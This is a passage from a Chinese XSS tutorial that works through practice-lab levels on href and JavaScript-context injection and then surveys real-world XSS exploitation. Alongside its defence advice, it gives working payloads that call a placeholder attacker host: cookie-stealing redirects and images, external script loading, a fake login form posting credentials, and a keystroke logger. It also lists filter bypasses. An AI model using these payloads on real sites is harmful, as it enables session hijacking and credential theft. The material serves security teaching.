（中间可以插入一些字符，具体要看过滤规则）

**方法三：用HTML实体编码**
```
&#106;avascript:alert(1)
```
（`&#106;`是`j`的HTML实体编码）

**方法四：用其他伪协议**
比如`data:`伪协议：
```
data:text/html,<script>alert(1)</script>
```

不过这个在某些浏览器里可能有安全限制。

总之，方法总比困难多！只要输出在`href`里，就有办法执行JS！😎

#### 还有哪些属性可以这样玩？

除了`href`，还有一些属性也支持伪协议，比如：

- `src`属性（iframe、script、img等标签）
- `action`属性（form标签）
- `formaction`属性（button标签）
- `data`属性（object标签）

这些如果用户可控的话，都有可能被利用来执行JS。

#### 怎么防御？

那对于href输出的场景，怎么防御呢？

1. **只允许http/https开头的URL**：白名单机制，只允许正常的网址
2. **检测javascript:等危险协议**：黑名单机制，过滤掉危险的伪协议
3. **转义特殊字符**：虽然不太能完全防住，但聊胜于无

最好的方法还是白名单，只允许你认为安全的URL格式，其他的一概不让过。就像小区门禁，只放本小区的人进，陌生人一律拦住，这样最安全！🏠

> 💡 **大白话总结**
> 
> href输出XSS的特点：
> - 用户输入输出在`<a>`标签的`href`属性里
> - 可以用`javascript:`伪协议来执行JS
> - 点击链接才会触发
> - 绕过方法：大小写、编码、其他伪协议等
> - 防御最好用白名单

第九关也轻松拿下！是不是觉得XSS的花样真多？不同位置有不同的玩法，真是太有意思了！🎮

### 第十关：xss之js输出 📜

好，接下来是第十关，也是XSS模块的最后一关："xss之js输出"。看名字就知道，这一关用户输入会输出在JavaScript代码里面。那这种情况怎么利用呢？

#### 什么是JS输出？

JS输出就是——用户输入的内容，被直接放到了JS代码里，作为JS代码的一部分来执行。

比如：
```javascript
var name = "用户输入的内容";
```

如果用户输入的内容里有引号，那会怎么样呢？

#### 查看题目

我们点击"xss之js输出"进入题目。

页面提示："请输入你的姓名"，下面有个输入框。

我们随便输入一个名字，比如`张三`，提交看看。

页面上显示："你好，张三！"

看起来平平无奇，对吧？那我们来看看页面的JS代码。按F12打开开发者工具，找一下JS部分。

你可能会看到类似这样的代码：
```javascript
var name = "张三";
document.write("你好，" + name + "！");
```

哦~ 原来我们输入的内容被直接放到了JS代码里，赋值给了`name`变量！

那这不就好办了吗？我们可以闭合引号，然后插入自己的JS代码！

#### 构造payload

我们来分析一下：
- 原始代码：`var name = "用户输入";`
- 用的是双引号
- 我们可以用双引号来闭合

那构造这样的payload：
```
";alert(1);//
```

我们来看看拼接后的结果：
```javascript
var name = "";alert(1);//";
```

完美！我们来分析一下：
1. 第一个`"`：闭合了字符串的开头双引号
2. `;`：结束`var name = ""`这条语句
3. `alert(1)`：我们自己的代码，弹窗
4. `;//`：注释掉后面的内容（`";`这部分）

这样一来，JS代码就变成了两条语句：
- `var name = "";`
- `alert(1);//`

第二条就是我们的弹窗代码，执行的时候就会弹窗！🎉

#### 实际测试

好，我们来实际操作一下。在输入框里输入：

```
";alert(1);//
```

然后提交……

**啪！** 页面一加载就弹窗了！成功！😎

是不是很简单？只要输出在JS代码里，我们就可以用闭合引号的方式来注入自己的代码。

> 💡 **单引号的情况呢？**
> 
> 如果JS代码里用的是单引号，那我们就用单引号来闭合：
> ```javascript
> var name = '用户输入';
> ```
> payload就是：
> ```
> ';alert(1);//
> ```
> 原理是一样的，就是用对应的引号来闭合。

#### 其他payload

除了`alert(1)`，我们还可以执行更复杂的操作，比如：

**偷Cookie：**
```
";document.location='http://攻击者.com/steal.php?cookie='+document.cookie;//
```

**加载外部脚本：**
```
";var s=document.createElement('script');s.src='http://攻击者.com/xss.js';document.body.appendChild(s);//
```

**弹Cookie：**
```
";alert(document.cookie);//
```

想写啥就写啥，完全由你控制！😏

#### 有过滤怎么办？

如果网站过滤了引号怎么办？那我们得想想其他办法……

**方法一：用反斜杠转义？**
不行，那是防御的方法。

**方法二：用String.fromCharCode**
如果引号被过滤了，我们可以用`String.fromCharCode`来构造字符串，不用引号：
```javascript
String.fromCharCode(97,108,101,114,116,40,49,41)
```
这个就相当于`"alert(1)"`。

不过具体怎么注入，要看实际情况。

**方法三：用模板字符串（反引号）**
如果JS是ES6版本的，还可以用反引号：
```
`;alert(1);//
```
不过这个得看输出在什么地方。

总之，只要能闭合字符串或者语句，就能注入代码。

#### 还有一种情况：输出在事件里

有时候，用户输入会输出在事件属性里，比如：
```html
<button onclick="alert('用户输入')">按钮</button>
```

这种其实也是JS输出的一种，不过是在HTML属性里的JS。

利用方式也是类似的，闭合引号就行：
```
');alert(1);//
```

拼接后变成：
```html
<button onclick="alert('');alert(1);//')">按钮</button>
```

点击按钮就会执行我们的代码。

#### 怎么防御？

对于JS输出的场景，怎么防御呢？

1. **对输出内容进行严格转义**：把引号、分号、反斜杠这些特殊字符都转义了
2. **用JSON.parse等安全方式处理**：不要直接把用户输入拼接到JS代码里
3. **用textContent而不是innerHTML**：如果只是显示内容，用textContent更安全

最根本的原则就是：**永远不要把用户输入直接拼接到JS代码里！** 这太危险了！

> 💡 **大白话总结**
> 
> JS输出XSS的特点：
> - 用户输入被直接输出在JS代码中
> - 可以用闭合引号的方式注入JS代码
> - payload格式：`";alert(1);//`（双引号场景）
> - 注释符`//`用来注释掉后面的代码
> - 防御方式：严格转义，不要直接拼接用户输入

## XSS利用方式简单介绍 🛠️

好了，XSS模块我们已经全部通关了。但是，你可能会问："不就是弹个窗吗？这有啥用啊？"

哈哈，问得好！弹窗只是XSS最最简单的演示，是用来证明"这里有漏洞"的。在真实的攻击中，XSS的利用方式可多了去了，危害也大得多！

下面我就简单给大家介绍几种常见的XSS利用方式，让大家开开眼界，也让大家知道XSS的危害到底有多大。👀

### 1. 偷取Cookie 🍪

这个是XSS最经典的利用方式，没有之一！

Cookie是什么？简单说，Cookie就是网站用来"记住你是谁"的一串字符。你登录网站之后，服务器会给你发一个Cookie，存在你的浏览器里。之后你再访问这个网站，浏览器就会自动带上这个Cookie，服务器一看Cookie，就知道"哦，是你啊"，然后就不用再登录了。

所以，Cookie就相当于你的"临时身份证"。如果别人拿到了你的Cookie，就可以冒充你登录你的账号！

**偷Cookie的payload：**
```javascript
<script>
    document.location = 'http://攻击者.com/steal.php?cookie=' + document.cookie;
</script>
```

原理很简单：把当前页面的Cookie作为参数，拼接到一个URL上，然后让浏览器跳转到这个URL。这样，攻击者的服务器就能从访问日志里看到你的Cookie了。

或者用更隐蔽的图片方式：
```javascript
<img src="http://攻击者.com/steal.php?cookie=xxx" style="display:none">
```

加载一张看不见的图片，顺便把Cookie带过去。神不知鬼不觉~ 😏

> ⚠️ **注意**：现在很多网站的Cookie都设置了`HttpOnly`属性，设置了这个属性的Cookie，JS是读不到的。这样就算有XSS，也偷不到Cookie了。这是一个很好的防御手段。

### 2. 钓鱼攻击 🎣

XSS还可以用来钓鱼。什么是钓鱼呢？就是伪造一个假的登录框，骗用户输入用户名和密码。

比如，你可以用XSS把页面改成这样：
```javascript
<script>
    document.body.innerHTML = '<h1>登录超时，请重新登录</h1>' +
        '<form action="http://攻击者.com/phish.php" method="POST">' +
        '用户名：<input type="text" name="username"><br>' +
        '密码：<input type="password" name="password"><br>' +
        '<input type="submit" value="登录">' +
        '</form>';
</script>
```

用户一看，"哦？登录超时了？" 然后就乖乖地输入用户名密码，一点登录，信息就发到攻击者那里去了。

这种方式防不胜防，因为页面确实是在真实网站的域名下，用户很难分辨真假。URL是对的，证书也是对的，但页面内容已经被XSS篡改了。

> 🎯 **生活例子**
> 
> 就像你去银行取钱，ATM机是真的，银行也是真的，但是有人在ATM机上装了个假的读卡装置和摄像头。你以为你在正常操作，但你的银行卡信息和密码已经被犯罪分子偷走了。

### 3. 键盘记录 ⌨️

XSS还可以记录用户在页面上敲的所有键盘按键。比如用户在输入密码、输入银行卡号的时候，敲了哪些键，都能被记录下来，然后发给攻击者。

**简单的键盘记录payload：**
```javascript
<script>
    var log = '';
    document.onkeydown = function(e) {
        log += String.fromCharCode(e.keyCode);
        // 定期把记录发回去
        if (log.length > 10) {
            var img = new Image();
            img.src = 'http://攻击者.com/log.php?key=' + log;
            log = '';
        }
    }
</script>
```

当然，这只是一个最最简单的版本。实际的键盘记录器会更复杂，也更隐蔽。

想想看，如果用户在一个有XSS的页面上输入了支付密码……细思极恐啊！😱

### 4. 网页篡改 🖼️

有了XSS，攻击者可以随意篡改网页内容。比如：

- 把新闻改成假新闻
- 把商品价格改成0
- 把网站的logo换成奇怪的东西
- 在页面上挂广告、挂马
- 等等

2011年，新浪微博就曾经爆发过XSS蠕虫，大量用户的账号被控制，自动发送带XSS的微博，导致病毒式传播。短短几十分钟，就有数万用户中招。

你看，XSS的危害有多大！

### 5. 打内网/端口扫描 🏠

你以为XSS只能搞当前网站？太天真了！如果受害者在内网里，攻击者还可以通过XSS让受害者的浏览器去扫描内网，甚至攻击内网的设备！

比如，受害者公司的内网里有很多办公系统，外网访问不到。但是如果受害者访问了一个有XSS的外网网站，攻击者就可以通过XSS，让受害者的浏览器去扫描内网的IP和端口，然后把结果发回来。

这就相当于在受害者的内网里装了一个"探子"，太可怕了！

这种攻击方式叫做"XSS打内网"，也叫"跨域端口扫描"。因为浏览器有同源策略，直接读不到响应内容，但是可以通过加载时间来判断端口是否开放。

### 6. 其他利用方式

除了上面说的这些，XSS还有很多玩法：
- 结合CSRF攻击
- 利用浏览器漏洞getshell
- 挖矿（让受害者的浏览器帮你挖比特币）
- DDoS攻击（让大量用户的浏览器去攻击某个网站）
- ……

只有你想不到，没有做不到！

> 💡 **温馨提示** 🔒
> 
> 说了这么多，不是让你去干坏事啊！这些知识是用来防御的——知道攻击者会怎么攻击，我们才能更好地保护自己的网站。
> 
> 记住，安全学习的目的是建设更安全的网络环境，而不是搞破坏。遵纪守法，做一个白帽子！🎩

### XSS的知识点回顾

我们来回顾一下XSS的几种类型和场景：

| 类型/场景 | 特点 | 利用方式 |
|-----------|------|---------|
| 反射型（GET） | 参数在URL里，一次性 | 直接`<script>alert(1)</script>` |
| 反射型（POST） | 参数在POST请求里 | Burp抓包、HackBar、构造表单 |
| 存储型 | 存在数据库，每次访问都触发 | 插入恶意代码，危害最大 |
| DOM型 | 纯前端处理，不经过服务器 | 看前端JS，找输出位置 |
| XSS盲打 | 后台触发，自己看不到 | 用XSS平台或接收端验证 |
| 有过滤的XSS | 过滤了script等关键字 | 大小写、双写、其他标签（img等） |
| htmlspecialchars | 转义了尖括号和双引号 | 默认不转义单引号，单引号闭合 |
| href输出 | 输出在a标签的href里 | 用`javascript:`伪协议 |
| JS输出 | 输出在JS代码里 | 闭合引号，`";alert(1);//` |

### 一个重要的思路

打XSS的时候，一定要记住这个思路：

> **先看输出位置，再看用什么引号，然后想怎么闭合/注入。**

就像医生看病，先诊断是什么病，再开药。不能上来就乱试payload，那样效率太低了。
